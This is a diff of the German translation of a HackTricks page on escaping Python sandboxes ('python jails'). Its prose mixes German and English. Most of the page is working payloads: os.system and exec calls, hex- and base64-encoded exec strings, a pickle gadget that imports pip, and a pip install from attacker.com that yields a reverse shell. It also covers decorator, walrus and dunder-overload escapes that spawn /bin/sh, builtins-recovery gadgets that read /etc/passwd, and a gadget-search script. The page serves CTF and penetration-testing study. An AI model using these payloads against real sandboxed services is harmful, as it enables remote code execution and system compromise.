@@ -2,11 +2,11 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Dies sind einige Tricks, um die Schutzmaßnahmen von Python-Sandboxes zu umgehen und beliebige Befehle auszuführen.
+Dies sind einige Tricks, um python Sandbox-Schutzmechanismen zu bypassen und beliebige Befehle auszuführen.
 
-## Command Execution Libraries
+## Bibliotheken zur Befehlsausführung
 
-Das erste, was Sie wissen müssen, ist, ob Sie Code direkt mit einer bereits importierten Bibliothek ausführen können oder ob Sie eine dieser Bibliotheken importieren könnten:
+Das Erste, was du wissen musst, ist, ob du Code direkt mit einer bereits importierten Bibliothek ausführen kannst, oder ob du eine dieser Bibliotheken importieren könntest:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -39,21 +39,21 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-Denke daran, dass die _**open**_ und _**read**_ Funktionen nützlich sein können, um **Dateien** innerhalb der Python-Sandbox zu **lesen** und um **Code** zu **schreiben**, den du **ausführen** könntest, um die Sandbox zu **umgehen**.
+Denke daran, dass die _**open**_ und _**read**_ Funktionen nützlich sein können, um **read files** innerhalb der python sandbox zu ermöglichen und um **write some code** zu erstellen, das du **execute** kannst, um die sandbox zu **bypass**.
 
-> [!CAUTION] > Die **Python2 input()** Funktion erlaubt das Ausführen von Python-Code, bevor das Programm abstürzt.
+> [!CAUTION] > **Python2 input()** Funktion erlaubt das Ausführen von Python-Code, bevor das Programm abstürzt.
 
-Python versucht, **Bibliotheken zuerst aus dem aktuellen Verzeichnis zu laden** (der folgende Befehl zeigt an, wo Python Module lädt): `python3 -c 'import sys; print(sys.path)'`
+Python versucht, **load libraries from the current directory first** (der folgende Befehl gibt aus, wo Python Module lädt): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
-## Umgehen der Pickle-Sandbox mit den standardmäßig installierten Python-Paketen
+## Bypass pickle sandbox with the default installed python packages
 
 ### Standardpakete
 
-Du kannst eine **Liste der vorinstallierten** Pakete hier finden: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Beachte, dass du aus einem Pickle die Python-Umgebung dazu bringen kannst, **willkürliche Bibliotheken** zu importieren, die im System installiert sind.\
-Zum Beispiel wird der folgende Pickle, wenn er geladen wird, die Pip-Bibliothek importieren, um sie zu verwenden:
+Du findest eine **Liste vorinstallierter Pakete** hier: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Beachte, dass du aus einem pickle die python-Umgebung dazu bringen kannst, **import arbitrary libraries** zu nutzen, die im System installiert sind.\
+For example, the following pickle, when loaded, is going to import the pip library to use it:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -66,32 +66,32 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-Für weitere Informationen darüber, wie Pickle funktioniert, siehe dies: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+Für weitere Informationen darüber, wie pickle funktioniert, siehe: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
-### Pip-Paket
+### Pip Paket
 
 Trick geteilt von **@isHaacK**
 
-Wenn Sie Zugriff auf `pip` oder `pip.main()` haben, können Sie ein beliebiges Paket installieren und eine Reverse-Shell erhalten, indem Sie Folgendes aufrufen:
+Wenn du Zugriff auf `pip` oder `pip.main()` hast, kannst du ein beliebiges Paket installieren und eine reverse shell erhalten, indem du aufrufst:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Sie können das Paket zum Erstellen der Reverse-Shell hier herunterladen. Bitte beachten Sie, dass Sie es **dekomprimieren, die `setup.py` ändern und Ihre IP für die Reverse-Shell einfügen** sollten:
+Du kannst das Paket zum Erstellen der reverse shell hier herunterladen. Bitte beachte, dass du es vor der Verwendung **dekomprimieren, die `setup.py` ändern und deine IP für die reverse shell eintragen** solltest:
 
 {{#file}}
 Reverse.tar (1).gz
 {{#endfile}}
 
 > [!TIP]
-> Dieses Paket heißt `Reverse`. Es wurde jedoch speziell so gestaltet, dass der Rest der Installation fehlschlägt, wenn Sie die Reverse-Shell verlassen, sodass Sie **keine zusätzlichen Python-Pakete auf dem Server installiert lassen**, wenn Sie gehen.
+> Dieses Paket heißt `Reverse`. Es wurde jedoch speziell so erstellt, dass beim Beenden der reverse shell die restliche Installation fehlschlägt, sodass du **kein zusätzliches python package auf dem Server zurücklässt**, wenn du gehst.
 
-## Eval-ing python code
+## Mit eval python-Code ausführen
 
 > [!WARNING]
-> Beachten Sie, dass exec mehrzeilige Strings und ";" erlaubt, eval jedoch nicht (überprüfen Sie den Walross-Operator).
+> Beachte, dass exec mehrzeilige Strings und ";" erlaubt, eval aber nicht (siehe walrus-Operator)
 
-Wenn bestimmte Zeichen verboten sind, können Sie die **hex/octal/B64**-Darstellung verwenden, um die Einschränkung zu **umgehen**:
+Wenn bestimmte Zeichen verboten sind, kannst du die **hex/octal/B64**-Darstellung verwenden, um die Einschränkung zu **bypass**:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -112,7 +112,7 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
-### Andere Bibliotheken, die die Ausführung von Python-Code ermöglichen
+### Andere Bibliotheken, die das Ausführen von eval python code erlauben
 ```python
 #Pandas
 import pandas as pd
@@ -126,6 +126,14 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
+Siehe auch ein reales sandboxed evaluator escape in PDF-Generatoren:
+
+- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). Es missbraucht rl_safe_eval, um über evaluierte Attribute (zum Beispiel font color) auf function.__globals__ und os.system zuzugreifen und einen gültigen Wert zurückzugeben, um das Rendering stabil zu halten.
+
+{{#ref}}
+reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
+{{#endref}}
+
 ## Operatoren und kurze Tricks
 ```python
 # walrus operator allows generating variable inside a list
@@ -135,9 +143,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-## Umgehung von Schutzmaßnahmen durch Kodierungen (UTF-7)
+## Umgehung von Schutzmechanismen durch Encodings (UTF-7)
 
-In [**diesem Bericht**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) wird UFT-7 verwendet, um beliebigen Python-Code innerhalb einer scheinbaren Sandbox zu laden und auszuführen:
+In [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) wird UFT-7 verwendet, um beliebigen python-Code innerhalb einer scheinbaren Sandbox zu laden und auszuführen:
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -148,11 +156,11 @@ return x
 #+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
-Es ist auch möglich, es mit anderen Kodierungen zu umgehen, z.B. `raw_unicode_escape` und `unicode_escape`.
+Es ist auch möglich, es mit anderen Kodierungen zu umgehen, z. B. `raw_unicode_escape` und `unicode_escape`.
 
 ## Python-Ausführung ohne Aufrufe
 
-Wenn Sie sich in einem Python-Gefängnis befinden, das **keine Aufrufe zulässt**, gibt es dennoch einige Möglichkeiten, **willkürliche Funktionen, Code** und **Befehle** **auszuführen**.
+Wenn du dich in einer python jail befindest, die **keine Aufrufe zulässt**, gibt es trotzdem einige Möglichkeiten, **beliebige Funktionen, Code** und **Befehle** auszuführen.
 
 ### RCE mit [decorators](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -176,13 +184,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### RCE Objekte erstellen und Überladen
+### RCE Erstellen von objects und overloading
 
-Wenn Sie eine **Klasse deklarieren** und ein **Objekt** dieser Klasse **erstellen** können, könnten Sie **verschiedene Methoden schreiben/überschreiben**, die **ausgelöst** werden können, **ohne** sie **direkt aufzurufen**.
+Wenn du **declare a class** und **create an object** dieser class kannst, könntest du **write/overwrite different methods** anlegen, die **triggered** werden können, **without needing to call them directly**.
 
-#### RCE mit benutzerdefinierten Klassen
+#### RCE mit custom classes
 
-Sie können einige **Klassenmethoden** (_indem Sie vorhandene Klassenmethoden überschreiben oder eine neue Klasse erstellen_) ändern, um sie **beliebigen Code auszuführen** zu lassen, wenn sie **ausgelöst** werden, ohne sie direkt aufzurufen.
+Du kannst einige **class methods** (_by overwriting existing class methods or creating a new class_) ändern, um sie dazu zu bringen, **execute arbitrary code**, wenn sie **triggered** werden, ohne sie direkt aufzurufen.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -232,9 +240,9 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
-#### Objekte mit [Metaklassen](https://docs.python.org/3/reference/datamodel.html#metaclasses) erstellen
+#### Objekte erstellen mit [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-Das Wesentliche, was Metaklassen uns ermöglichen, ist **eine Instanz einer Klasse zu erstellen, ohne den Konstruktor** direkt aufzurufen, indem wir eine neue Klasse mit der Zielklasse als Metaklasse erstellen.
+Das Entscheidende, was metaclasses uns ermöglichen, ist, **eine Instanz einer Klasse zu erzeugen, ohne den Konstruktor direkt aufzurufen**, indem man eine neue Klasse erstellt, bei der die Zielklasse als metaclass fungiert.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -249,9 +257,9 @@ Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-#### Erstellen von Objekten mit Ausnahmen
+#### Erstellen von Objekten mit exceptions
 
-Wenn eine **Ausnahme ausgelöst wird**, wird ein Objekt der **Exception** **erstellt**, ohne dass Sie den Konstruktor direkt aufrufen müssen (ein Trick von [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
+Wenn eine **exception ausgelöst** wird, wird ein Objekt der **Exception** **erstellt**, ohne dass du den constructor direkt aufrufen musst (ein Trick von [**@\_nag0mez**](https://mobile.twitter.com/_nag0mez)):
 ```python
 class RCE(Exception):
 def __init__(self):
@@ -293,7 +301,7 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### Datei mit builtins Hilfe & Lizenz lesen
+### Datei mit builtins help & license lesen
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -304,20 +312,20 @@ pass
 ```
 ## Builtins
 
-- [**Builtins-Funktionen von python2**](https://docs.python.org/2/library/functions.html)
-- [**Builtins-Funktionen von python3**](https://docs.python.org/3/library/functions.html)
+- [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
+- [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-Wenn Sie auf das **`__builtins__`** Objekt zugreifen können, können Sie Bibliotheken importieren (beachten Sie, dass Sie hier auch eine andere Zeichenfolgenrepräsentation verwenden könnten, die im letzten Abschnitt gezeigt wurde):
+Wenn du auf das **`__builtins__`**-Objekt zugreifen kannst, kannst du Bibliotheken importieren (beachte, dass du hier auch andere, im letzten Abschnitt gezeigte String-Repräsentationen verwenden könntest):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### Keine Builtins
 
-Wenn Sie `__builtins__` nicht haben, können Sie nichts importieren und auch keine Dateien lesen oder schreiben, da **alle globalen Funktionen** (wie `open`, `import`, `print`...) **nicht geladen sind**.\
-Allerdings **importiert Python standardmäßig viele Module in den Speicher**. Diese Module mögen harmlos erscheinen, aber einige von ihnen **importieren auch gefährliche** Funktionalitäten, die genutzt werden können, um sogar **willkürliche Codeausführung** zu erlangen.
+Wenn du kein `__builtins__` hast, wirst du nichts importieren können, noch Dateien lesen oder schreiben, da **alle globalen Funktionen** (wie `open`, `import`, `print`...) **nicht geladen** sind.\
+Allerdings importiert Python **standardmäßig viele Module in den Speicher**. Diese Module mögen harmlos erscheinen, aber einige von ihnen importieren **auch gefährliche** Funktionalitäten in sich, auf die zugegriffen werden kann, um sogar **arbitrary code execution** zu erreichen.
 
-In den folgenden Beispielen können Sie beobachten, wie man einige dieser "**harmlosen**" Module missbrauchen kann, um **gefährliche** **Funktionalitäten** in ihnen **zuzugreifen**.
+In den folgenden Beispielen kannst du beobachten, wie einige dieser als **„harmlos“** geladenen Module **missbraucht** werden können, um auf **gefährliche** **Funktionalitäten** in ihnen zu **zugreifen**.
 
 **Python2**
 ```python
@@ -359,15 +367,15 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Unten gibt es eine größere Funktion**](#recursive-search-of-builtins-globals), um Dutzende/**Hunderte** von **Orten** zu finden, an denen Sie die **builtins** finden können.
+[**Below there is a bigger function**](#recursive-search-of-builtins-globals) um Dutzende/**Hunderte** von **Stellen** zu finden, an denen du die **builtins** finden kannst.
 
-#### Python2 und Python3
+#### Python2 and Python3
 ```python
 # Recover __builtins__ and make everything easier
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Builtins-Payloads
+### Builtins payloads
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -375,9 +383,9 @@ __builtins__["__import__"]("os").system("ls")
 # There are lots of other payloads that can be abused to execute commands
 # See them below
 ```
-## Globals und Locals
+## Globals und locals
 
-Das Überprüfen der **`globals`** und **`locals`** ist eine gute Möglichkeit, um zu wissen, auf was Sie zugreifen können.
+Das Überprüfen der **`globals`** und **`locals`** ist eine gute Möglichkeit, festzustellen, worauf du zugreifen kannst.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -401,15 +409,15 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Unten gibt es eine größere Funktion**](#recursive-search-of-builtins-globals), um Dutzende/**Hunderte** von **Orten** zu finden, an denen Sie die **globals** finden können.
+[**Unten befindet sich eine größere Funktion**](#recursive-search-of-builtins-globals) um Dutzende/**Hunderte** von **Stellen** zu finden, an denen du die **globals** finden kannst.
 
-## Entdeckung arbiträrer Ausführung
+## Discover Arbitrary Execution
 
-Hier möchte ich erklären, wie man leicht **gefährlichere Funktionen** entdecken kann, die geladen werden, und zuverlässigere Exploits vorschlagen.
+Hier möchte ich erklären, wie man leichter **gefährlichere geladene Funktionalitäten** entdeckt und zuverlässigere exploits vorschlägt.
 
-#### Zugriff auf Unterklassen mit Bypässen
+#### Zugriff auf subclasses mit bypasses
 
-Einer der sensibelsten Teile dieser Technik ist der Zugriff auf die **Basisunterklassen**. In den vorherigen Beispielen wurde dies mit `''.__class__.__base__.__subclasses__()` erreicht, aber es gibt **andere mögliche Wege**:
+Einer der sensibelsten Teile dieser Technik ist die Fähigkeit, **auf die base subclasses zuzugreifen**. In den vorherigen Beispielen wurde dies mit `''.__class__.__base__.__subclasses__()` gemacht, aber es gibt **andere mögliche Wege**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -439,16 +447,16 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Gefährliche geladene Bibliotheken finden
 
-Zum Beispiel, wenn man weiß, dass man mit der Bibliothek **`sys`** **willkürliche Bibliotheken importieren** kann, kann man nach allen **Modulen suchen, die sys darin importiert haben**:
+Zum Beispiel: Wenn man weiß, dass man mit der Bibliothek **`sys`** beliebige Bibliotheken **importieren** kann, kann man nach allen **geladenen Modulen suchen, die `sys` importiert haben**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-Es gibt viele, und **wir brauchen nur einen**, um Befehle auszuführen:
+Es gibt viele, und **wir brauchen nur eine**, um Befehle auszuführen:
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-Wir können dasselbe mit **anderen Bibliotheken** tun, von denen wir wissen, dass sie verwendet werden können, um **Befehle auszuführen**:
+Wir können dasselbe mit **anderen Bibliotheken** tun, von denen wir wissen, dass sie zur **Ausführung von Befehlen** verwendet werden können:
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -483,7 +491,7 @@ Wir können dasselbe mit **anderen Bibliotheken** tun, von denen wir wissen, das
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-Darüber hinaus könnten wir sogar nachsehen, welche Module bösartige Bibliotheken laden:
+Außerdem könnten wir sogar herausfinden, welche Module bösartige Bibliotheken laden:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 for b in bad_libraries_names:
@@ -502,7 +510,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Darüber hinaus, wenn Sie denken, dass **andere Bibliotheken** in der Lage sein könnten, **Funktionen aufzurufen, um Befehle auszuführen**, können wir auch **nach Funktionsnamen** innerhalb der möglichen Bibliotheken **filtern**:
+Außerdem, wenn du denkst, dass **other libraries** möglicherweise **invoke functions to execute commands**, können wir auch **filter by functions names** innerhalb der möglichen libraries anwenden:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -535,10 +543,10 @@ execute:
 __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
 """
 ```
-## Rekursive Suche nach Builtins, Globals...
+## Rekursive Suche nach builtins, globals...
 
 > [!WARNING]
-> Das ist einfach **großartig**. Wenn Sie **nach einem Objekt wie globals, builtins, open oder etwas anderem suchen**, verwenden Sie einfach dieses Skript, um **rekursiv Orte zu finden, an denen Sie dieses Objekt finden können.**
+> Das ist einfach **großartig**. Wenn du **nach einem Objekt wie globals, builtins, open oder Ähnlichem suchst** benutze einfach dieses Skript, um **rekursiv Stellen zu finden, an denen du dieses Objekt finden kannst.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -654,7 +662,8 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-Sie können die Ausgabe dieses Skripts auf dieser Seite überprüfen:
+Du kannst die Ausgabe dieses Skripts auf dieser Seite ansehen:
+
 
 {{#ref}}
 https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
@@ -662,7 +671,7 @@ https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-
 
